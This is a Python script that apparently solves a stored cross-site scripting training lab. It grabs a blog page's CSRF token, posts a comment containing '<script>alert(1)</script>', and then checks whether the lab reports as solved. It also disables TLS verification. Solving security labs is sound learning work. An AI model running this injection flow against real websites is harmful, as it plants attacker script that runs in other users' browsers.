from bs4 import BeautifulSoup
from urllib.parse import urlencode, urljoin

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("-x", "--use-proxy", action="store_true")
    return parser.parse_args()


def print_info(string):
    print(f"\033[1;94m[*]\033[00m {string}")


def print_success(string):
    print(f"\033[1;92m[+]\033[00m {string}")


def print_fail(string):
    print(f"\033[1;91m[-]\033[00m {string}")


def verify_lab_accessible(url):
    print_info("Checking if given URL is accessible...")
    resp = requests.get(url)
    if resp.status_code != 504:
        print_success("URL is accessible.\n")
    else:
        print_fail("URL is inaccessible. Reopen the lab and use new URL.")
        exit(1)


def verify_lab_solved(url):
    print_info("Revisiting URL to verify if attack was successful...")
    resp = requests.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    if soup.select_one("#notification-labsolved"):
        print_success("Attack successful. Lab solved.")
    else:
        print_fail("Lab unsolved. Ensure...")
        exit(1)


def solve_lab(url, proxies):
    url = urljoin(url, "/post")
    params = {"postId": 1}
    print_info(f'Grabbing CSRF value from "{url}?{urlencode(params)}"')

    s = requests.session()
    resp = s.get(url, params=params, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")
        exit(1)
    else:
        print_success(f"CSRF value: {csrf}\n")

    url = urljoin(url, "/post/comment")
    data = {
        "csrf": csrf,
        "postId": 1,
        "comment": "<script>alert(1)</script>",
        "name": "user",
        "email": "user@example.com",
        "website": "",
    }
    print_info(
        "Performing stored XSS attack by posting a comment with the following values:"
    )
    print(data)

    resp = s.post(url, proxies=proxies, verify=False, data=data)
    print_success("Stored XSS attack performed.\n")


def main():
    args = get_args()
    root_url = urljoin(args.url, "/")

    verify_lab_accessible(root_url)

    proxies = None
    if args.use_proxy:
        proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
        print_info('Using "http://127.0.0.1:8080" as a proxy')

    solve_lab(root_url, proxies)
    verify_lab_solved(root_url)


if __name__ == "__main__":
    main()